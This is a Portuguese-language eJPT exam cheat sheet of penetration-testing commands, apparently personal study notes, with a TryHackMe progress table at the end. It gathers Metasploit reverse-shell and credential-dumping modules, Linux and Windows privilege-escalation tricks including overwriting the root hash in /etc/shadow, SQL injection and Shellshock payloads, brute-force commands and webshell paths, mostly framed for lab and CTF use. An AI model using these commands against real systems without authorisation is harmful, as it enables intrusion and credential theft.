# 🧠 eJPT Cheat Sheet

---

## 🔍 Nmap

```bash
# Scan inicial
nmap -p- -sV -sC <IP>
nmap -p- -A -v <IP>

# Scan completo
nmap -Pn -p- -T4 <IP>

# Serviços + scripts
nmap -sC -sV -p <PORTAS> <IP>

# Completo agressivo
nmap -Pn -A -v <IP>

# Scan de vulnerabilidades
nmap --script vuln <IP>

# Detecção de OS (forçar palpite)
nmap -O --osscan-guess <IP>

# Combinação mais completa (recomendada)
nmap -sC -sV -p- --script vuln <IP>

# Output
nmap -oN scan.txt -oX scan.xml <IP>
```

### 🚨 Dicas Importantes

- _Verificar `/etc/hosts` do Kali — se a prova não tem hosts na net, os domínios precisam estar declarados na máquina do atacante_
- _Observar banners de serviços e protocolos (podem conter dicas ou flags)_
- _`--osscan-guess` força um palpite de sistema operacional mesmo quando o Nmap tem baixa certeza — útil quando `-O` sozinho não retorna resultado_

---

## 📊 Organização

_No momento que a prova iniciar é importante que tenha uma planilha com os seguintes tópicos_

| Nome do host | IP | Serviços | Credenciais | Vulnerabilidades | Observações |
|--------------|----|----------|-------------|------------------|-------------|

---

## 💣 Metasploit

### ⚙️ Inicialização Correta

_Sempre seguir essa ordem ao iniciar o msfconsole:_

```bash
service postgresql start   # iniciar o banco de dados
msfconsole -q              # abrir sem banner
db_status                  # confirmar conexão com o banco
```

_Com o banco ativo, o nmap pode ser rodado diretamente pelo MSF:_

```bash
db_nmap -sV -sC -p- <IP>   # resultados ficam salvos no workspace
```

### 🔎 Busca de Exploits

```bash
# Dentro do msfconsole
search <termo>
use <exploit>

# Fora do msfconsole (terminal)
searchsploit <termo>         # busca no banco local do Exploit-DB
searchsploit -m <ID>         # copia o exploit para o diretório atual
```

> 💡 `searchsploit` é um método de busca independente — não esquecer dele!

### Uso Comum

```bash
use exploit/multi/handler                    # fazer shell dentro do msfconsole
use post/multi/manage/shell_to_meterpreter   # melhorar a shell
use post/multi/recon/local_exploit_suggester # sugestão para exploit local
```

### Como procurar payloads (Meterpreter)

```bash
show payloads
search type:payload meterpreter
```

### 🎯 Módulos e Payloads Úteis

```bash
# SMB brute-force / pass-the-hash
use auxiliary/scanner/smb/smb_login
set RHOSTS <IP>
set USER_FILE users.txt
set PASS_FILE passwords.txt     # em pass-the-hash: usar wordlist de hashes NTLM aqui

# Bypass autenticação SSH (libssh)
use auxiliary/scanner/ssh/libssh_auth_bypass
set RHOSTS <IP>
run

# Payload MSSQL (Windows - CLR)
use exploit/windows/mssql/mssql_clr_payload
```

> 💡 Em ambientes Windows, preferir payload `x64` para Meterpreter:

```bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

---

## 🐍 Shell Upgrade

```bash
# Python 3
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Python 2
python -c 'import pty; pty.spawn("/bin/sh")'

# Alternativo
python -c 'import os; os.system("/bin/bash")'
```

---

## 🔐 Privilege Escalation - Linux

```bash
whoami
id
uname -a
cat /etc/os-release
cat /etc/crontab
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
ps aux | grep root
```

### 💡 Dicas de Enumeração

```bash
# Listagem detalhada de arquivos (preferir sempre)
ls -la       # ocultos + permissões
ls -lhart    # ordenado por data, mais recente por último

# Crons — verificar TODOS os diretórios
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.weekly/
ls -la /etc/cron.hourly/

# Usuários do sistema
ls /home/
```

### 📝 Arquivos Graváveis

```bash
# Arquivos com permissão de escrita para outros (não symlinks)
find / -not -type l -perm -o+w 2>/dev/null
```

### 📋 Arquivos de Configuração Importantes

```bash
cat /etc/group        # grupos e membros
cat /etc/resolv.conf  # servidores DNS (revela rede interna)
cat /etc/hosts        # mapeamento local de IPs/domínios
cat /etc/shells       # shells disponíveis no sistema
```

### 🐚 Permissões de Shells + SUID Exploit

_Pessoas costumam focar em `/bin/bash` e `/bin/sh`, mas existem shells alternativas como `/bin/rbash` que podem ter SUID:_

```bash
# Verificar permissões de todas as shells disponíveis
cat /etc/shells | while read shell; do ls -l $shell 2>/dev/null; done

# Se o binário 'find' tiver SUID, usar shell alternativa para privesc
find / -exec /bin/rbash -p \; -quit
```

> 💡 O `-p` no rbash preserva os privilégios do SUID — sem ele o shell descarta as permissões elevadas.

### 🔑 Manipulação do /etc/shadow (CTF)

_Situação: você tem permissão de escrita no `/etc/shadow` e o root tem `*` no campo de senha (sem senha definida)._

```bash
# 1. Gerar hash MD5 de uma senha conhecida
openssl passwd -1 -salt abc password
# Retorna algo como: $1$abc$HASH...

# 2. Substituir o * do root pelo hash gerado
# Antes: root:*:19000:...
# Depois: root:$1$abc$HASH...:19000:...

# 3. Trocar para root
su root
# senha: password
```

| Parâmetro | Função |
|-----------|--------|
| `openssl passwd` | Gera hash de senha |
| `-1` | Algoritmo MD5-crypt (formato `$1$`) |
| `-salt abc` | Salt fixo adicionado antes do hash |
| `password` | Senha em texto plano |

> 💡 O `*` no `/etc/shadow` indica conta sem senha — substituir pelo hash permite autenticação via `su`.

---

## PrivEsc Windows

```bash
whoami
whoami /priv
whoami /groups

systeminfo
hostname
ver

net user
net localgroup
net localgroup administrators

cmdkey /list
runas /?

dir C:\ /s /b | findstr /i "password"
dir C:\ /s /b | findstr /i ".config .xml .ini .txt"

tasklist /v

ipconfig /all
netstat -ano
route print
arp -a

net share
```

### 🪟 Windows DIR — Referência Rápida

| Comando | Função |
|---------|--------|
| `dir` | Lista arquivos do diretório atual |
| `dir /s` | Busca recursiva (subpastas) |
| `dir /b` | Saída limpa (somente caminhos) |
| `dir /a` | Inclui arquivos ocultos e de sistema |
| `dir /q` | Mostra dono do arquivo |

### 🔒 Permissões de Arquivos/Diretórios (icacls)

```bash
# Ver permissões
icacls <arquivo_ou_diretorio>

# Remover restrição de acesso (ex: remover deny do SYSTEM)
icacls flag /remove:d "NT AUTHORITY\SYSTEM"

# Conceder controle total
icacls <arquivo> /grant <user>:F
```

> 💡 Útil para acessar arquivos bloqueados ou modificar permissões após escalação de privilégio.

### Metasploit — PrivEsc Windows

```bash
# =========================
# 🔎 ENUM BÁSICA
# =========================
getuid
sysinfo
getprivs

# =========================
# 🔥 TENTATIVA AUTOMÁTICA
# =========================
getsystem

# =========================
# 🎭 TOKEN IMPERSONATION
# =========================
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"

# =========================
# 🧨 BYPASS UAC (SE FOR ADMIN)
# =========================
background
use exploit/windows/local/bypassuac
set SESSION <ID>
run

# =========================
# 🔐 DUMP DE HASHES
# =========================
hashdump

# =========================
# 🧠 PÓS-EXPLORAÇÃO
# =========================
ps
migrate <PID>

# =========================
# 📂 COLETA DE DADOS
# =========================
ls
pwd
download <arquivo>

# =========================
# 🌐 REDE / SERVIÇOS LOCAIS
# =========================
ipconfig
arp
netstat
# (rodar no console Meterpreter, NÃO no channel de shell)
netstat -tuln 127.0.0.1    # lista serviços escutando localmente

# =========================
# 👥 USUÁRIOS DO SISTEMA
# =========================
# Linux
shell && ls /home/

# Windows
shell && dir C:\Users\

# =========================
# 💀 EXTRA (SE TIVER PRIV)
# =========================
load kiwi
creds_all
```

---

## 🌐 Web / Arquivos

### ⚠️ Vetores Comuns — Não Esquecer

- **Path Traversal** — tentar `../../etc/passwd` em parâmetros de URL ou upload
- **SQLi em login** — testar payloads clássicos antes de partir para brute force:
  ```
  ' OR '1'='1
  ' OR 1=1--
  admin'--
  ```
- **Arquivos de backup** — usar DIRB com `-X .bak,.tar.gz,.zip,.sql,.bak.zip` para varrer extensões sensíveis diretamente

### Prestar Atenção em Arquivos de Backup e Variações

```
.bak
.old
.save
.zip
.tar
```

Exemplos:

```
wp-config.php.bak
config.old
backup.sql
```

### 🔍 Ferramentas de Enumeração Web

```bash
# Nikto - scanner de vulnerabilidades web
nikto -h http://<IP>

# Gobuster - descoberta de diretórios
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt

# Dirsearch - descoberta de diretórios
dirsearch -u http://<IP>

# Nuclei - scanner de vulnerabilidades baseado em templates
nuclei -u http://<IP>

# WPScan - scanner para WordPress
wpscan --url http://<IP>
wpscan --url http://<IP> -U users.txt -P passwords.txt          # brute force
wpscan --url http://<IP> --enumerate p --plugins-list /usr/share/nmap/nselib/data/wp-plugins.lst
```

### DIRB

```bash
# Scan básico
dirb http://<IP>

# Com wordlist customizada + extensões específicas
dirb http://<IP> /usr/share/dirb/wordlists/big.txt \
     -X .bak,.tar.gz,.zip,.sql,.bak.zip

# Com autenticação HTTP Basic (enumeração + login simultâneo)
dirb http://<IP> -u <username>:<password>
```

> 💡 O `-u` é muito útil em CTFs — permite enumerar diretórios protegidos por Basic Auth quando você já tem credenciais.

---

## 📥 Download / Mirror de Sites

### Wget

```bash
wget -r -np -nH --cut-dirs=1 <URL>   # mirror recursivo
```

### HTTrack

```bash
# Mirror completo do site para arquivo local
httrack http://<IP> -O output.html

# Com autenticação
httrack http://<IP> -O output.html --auth=<user>:<pass>
```

> 💡 HTTrack é útil para navegar offline pelo site e identificar estrutura de diretórios, formulários e links ocultos.

---

## 🔓 Brute Force / Enumeração Ativa

### 📂 Wordlists Comuns no Ambiente de Prova

| Wordlist | Uso |
|----------|-----|
| `/root/Desktop/wordlists/unix_passwords.txt` | Senhas Unix genéricas |
| `/root/Desktop/wordlists/shares.txt` | Nomes de shares SMB |
| `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt` | Senhas Unix via MSF |
| `/usr/share/metasploit-framework/data/wordlists/common_users.txt` | Usuários comuns via MSF |
| `/usr/share/nmap/nselib/data/wp-plugins.lst` | Plugins WordPress (wpscan/nmap) |
| `/usr/share/wordlists/rockyou.txt` | Senhas gerais (John, Hydra) |
| `/usr/share/wordlists/dirb/common.txt` | Diretórios web (gobuster, ffuf) |
| `/usr/share/seclists/Usernames/top-usernames-shortlist.txt` | Usuários comuns (Hydra) |

As wordlists mais usadas no curso estão no path: `/usr/share/wordlists/metasploit`

### 💣 Hydra

```bash
# SSH
hydra -l <user> -P wordlist.txt ssh://<IP>

# FTP
hydra -l <user> -P wordlist.txt ftp://<IP>

# HTTP POST login
hydra -l <user> -P wordlist.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# HTTP POST — exemplo com seclists (eJPT)
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
      -P /root/Desktop/wordlists/100-common-passwords.txt \
      target.ine.local \
      http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid username or password"
```

### 🚀 FFUF

```bash
# Descoberta de diretórios
ffuf -u http://<IP>/FUZZ -w wordlist.txt

# Extensões
ffuf -u http://<IP>/FUZZ -w wordlist.txt -e .php,.txt,.bak

# Virtual hosts
ffuf -u http://<IP> -H "Host: FUZZ.<domain>" -w wordlist.txt

# Filtrar por tamanho
ffuf -u http://<IP>/FUZZ -w wordlist.txt -fs 0
```

### 🔑 John the Ripper

```bash
# Hash do Windows (hashdump)
john --format=NT hashdump.txt

# Com wordlist
john --format=NT hashdump.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Ver resultados
john --show hashdump.txt
```

---

## 🧾 SMB

```bash
smbclient -L //<IP> -N
smbclient //<IP>/share -N
```

### 🗺️ smbmap

```bash
# Listagem anônima
smbmap -H <IP>

# Com credenciais
smbmap -H <IP> -u <user> -p <pass>

# Listar recursivamente
smbmap -H <IP> -u <user> -p <pass> -R
```

### 🔁 Script de Enumeração de Shares (fallback)

_Usar quando `smbmap` ou `crackmapexec` não funcionarem:_

```bash
#!/bin/bash
TARGET="target.ine.local"
WORDLIST="/root/Desktop/wordlists/shares.txt"

if [ ! -f "$WORDLIST" ]; then
    echo "Wordlist not found: $WORDLIST"
    exit 1
fi

while read -r SHARE; do
    echo "Testing share: $SHARE"
    smbclient //$TARGET/$SHARE -N -c "ls" &>/dev/null
    if [ $? -eq 0 ]; then
        echo "[+] Anonymous access allowed for: $SHARE"
    else
        echo "[-] Access denied for: $SHARE"
    fi
done < "$WORDLIST"
```

> 💡 Salvar como `enum_shares.sh` e rodar com `chmod +x enum_shares.sh && ./enum_shares.sh`

### 🧨 CrackMapExec

```bash
# SMB brute force
crackmapexec smb <IP> -u users.txt -p passwords.txt

# Validar credenciais
crackmapexec smb <IP> -u <user> -p <pass>

# Executar comando
crackmapexec smb <IP> -u <user> -p <pass> -x "whoami"
```

---

## 🗄️ Banco de Dados

### 🐬 MySQL

```bash
# Conexão
mysql -u <user> -p -h <IP>

# Conexão direta com senha
mysql -u root -p<senha> -h <IP>
```

```sql
-- Enumeração básica
show databases;
use <database>;
show tables;
describe <tabela>;

-- Dump de dados
select * from <tabela>;
```

> 💡 Procurar por tabelas ou colunas com nomes como `secret`, `secret_info`, `hidden`, `flag`, `credentials`, `admin` — em CTFs é comum esconder dados sensíveis com esses nomes.

---

## 🦈 Wireshark

> 💡 `Ctrl+F` dentro do Wireshark permite pesquisar strings/valores dentro dos pacotes capturados.

### 🔎 Filtros Úteis

```
http                        # todo tráfego HTTP
http.response.code == 200   # respostas HTTP com sucesso
http.response.code == 401   # autenticação requerida
http.response.code == 403   # acesso negado
nbns                        # NetBIOS Name Service (resolução de nomes Windows)
ftp                         # tráfego FTP
ftp-data                    # dados transferidos via FTP
tcp.port == <PORTA>         # filtrar por porta específica
ip.addr == <IP>             # filtrar por IP (origem ou destino)
ip.src == <IP>              # apenas origem
ip.dst == <IP>              # apenas destino
```

---

## 🔄 Pivoting

_Existe mais de um IP na rede DMZ e talvez seja exatamente por isso que seja necessário realizar o pivoteamento._

_Dentro da DMZ tem mais de uma máquina, mas aparentemente só tem uma máquina que tem comunicação com a rede interna, preciso descobrir qual é e fazer o pivot o quanto antes._

_Para realizar o pivoteamento o melhor cenário é o MSF Routing usando MSF autoroute + portfwd_

### Enumeração de Rede

```bash
ip a
route -n
```

### Pivoting com Metasploit (MSF)

```bash
run autoroute -s <REDE_INTERNA>
```

### Redirecionamento de Portas (Port Forwarding)

```bash
portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <IP_INTERNO>
```

---

## 🎯 Ataques Específicos

_Alguns cenários exigem ataques direcionados a serviços ou vulnerabilidades específicas, exigindo identificação precisa do vetor e execução manual._

### 📌 Shellshock

_Explora variáveis de ambiente em servidores vulneráveis ao Bash, podendo ser realizado manualmente através de headers HTTP._

**Manual (via header HTTP):**
- Vetor: Header `User-Agent`
- Payload: `() { :; }; echo; /bin/bash -c 'cat /flag.txt'`

**Via Metasploit:**

```bash
# Scanner — verifica se é vulnerável
use scanner/http/apache_mod_cgi_bash_env
set RHOSTS <IP>
run

# Exploit — executa comando / abre shell
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS <IP>
set LHOST <SEU_IP>
run
```

<img width="1913" height="983" alt="image" src="https://github.com/user-attachments/assets/02f2aba8-290f-451b-9652-cc420b80ff62" />


### WebDAV

- Pode permitir upload de webshells
- Útil para RCE em servidores IIS mal configurados

### PsExec

- Execução remota via SMB
- Muito utilizado em movimentação lateral

### 📌 Webshells

O Kali possui uma coleção completa de webshells prontas:

```bash
ls /usr/share/webshells/
# Subpastas: asp/ aspx/ cfm/ jsp/ perl/ php/
```

| Tipo | Caminho |
|------|---------|
| ASP | `/usr/share/webshells/asp/webshell.asp` |
| PHP | `/usr/share/webshells/php/php-reverse-shell.php` |

_Útil após upload via WebDAV, falhas de file upload ou LFI para obter RCE._

---

## 🔧 Protocolos / Ferramentas Incomuns

### 📦 Rsync

_Protocolo de sincronização de arquivos — pode expor backups e arquivos sensíveis sem autenticação._

```bash
# Listar módulos disponíveis
rsync rsync://<IP>

# Baixar conteúdo de um módulo
rsync -av rsync://<IP>/<modulo>/ .
# -a = archive mode (preserva permissões, timestamps, etc.)
# -v = verbose
```

Exemplo real:

```bash
rsync -av rsync://target1.ine.local/backupwscohen/ .
```

---

## 🏁 Flags

_Aparentemente as perguntas te guiam para onde estão as flags_

Formato:

```
FLAG{hashMD5}
```

Exemplo:

```
FLAG1{23c7d4bababf8048c0cda5136ac83c9e}
```

✔ Enviar apenas:

```
23c7d4bababf8048c0cda5136ac83c9e
```

---

# 🧠 TryHackMe - Controle de Estudos

---

## 📊 Progresso das Máquinas

| Máquina | Tipo | Dificuldade | Status | Notas / Lições |
|---------|------|-------------|--------|----------------|
| Ignite | Web | Easy | 🟩 | |
| Startup | Linux | Easy | 🟩 | |
| RootMe | Web | Easy | 🟨 | |
| Blog WordPress | Web | Easy | ⬜ | |
| Blue | Windows | Easy | 🟨 | |
| Blueprint | Windows | Easy | ⬜ | |

## ✅ Legenda

- ⬜ Não iniciado
- 🟨 Em andamento
- 🟩 Concluído

---

## 🧠 Notas Gerais

- Reutilizar credenciais entre serviços
- Focar em enumeração antes de explorar
- Testar sempre SMB, HTTP e FTP
- Procurar arquivos de backup (`.bak`, `.old`, `.save`)
- Observar banners e versões
- Documentar tudo durante o processo
- Sempre usar `ls -la` ou `ls -lhart` — arquivos ocultos são comuns em CTFs
- Verificar **todos** os diretórios de cron (`/etc/cron.d`, `/etc/cron.daily`, etc.)
- `netstat` dentro do Meterpreter requer console MSF — não funciona no channel de shell
- Listar `/home` (Linux) e `C:\Users` (Windows) para mapear usuários existentes
- `searchsploit` é um método de busca de exploit independente do MSF — não esquecer dele
